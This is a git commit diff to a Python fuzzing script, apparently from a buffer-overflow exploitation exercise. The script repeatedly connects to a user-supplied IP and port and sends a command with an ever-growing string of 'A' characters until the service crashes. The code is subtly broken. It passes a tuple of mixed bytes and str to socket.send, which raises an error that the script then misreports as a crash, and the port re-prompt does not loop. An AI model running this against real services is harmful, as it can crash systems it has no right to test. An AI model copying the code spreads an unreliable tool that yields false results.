8df86b8da006225a84cd63b382338d56c7d4e58d
Adib-LGS <adib.l@outlook.fr>
2023-04-19 20:25:05 -0400

    Edit Fuzzing script

--- Phase_3/fuzz.py
+++ Phase_3/fuzz.py
@@ -18,21 +18,28 @@ print("you entered: " + ip)
 if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
     print('Invalid IP format')
 
+
 else:
-    port = input("Enter Port number here: ")
+    port = int(input("Enter Port number here: "))
     cmd_name = input(str("Enter the wanted cmd to check: "))
+    cmd_name = str.encode(cmd_name)
+    #print(type(cmd_name))
 
-    while True:
-        try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip, port))
-
-                s.send((cmd_name,'/.:/' + buffer_over_the_rainbow))
-                s.close()
-                sleep(1)
-                buffer_over_the_rainbow += "A"*100
-        
-        except:
-            print ("Fuzzing crashed at %s bytes, check the inputs that you have provided" % str(len(buffer_over_the_rainbow)))
-            sys.exit()
+    if port >= 1 and port <= 65535:
+        while True:
+            try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip, port))
+                    s.send((cmd_name, ' /.:/' + buffer_over_the_rainbow))
+                    s.close()
+                    sleep(1)
+                    buffer_over_the_rainbow += "A"*100
+            
+            except Exception as e:
+                    print(e)
+                    print ("Fuzzing crashed at %s bytes, check the inputs that you have provided" % str(len(buffer_over_the_rainbow)))
+                    sys.exit()
+    else:
+        port = int(input("Enter again a Port number between 1 and 65535: "))
+  
 
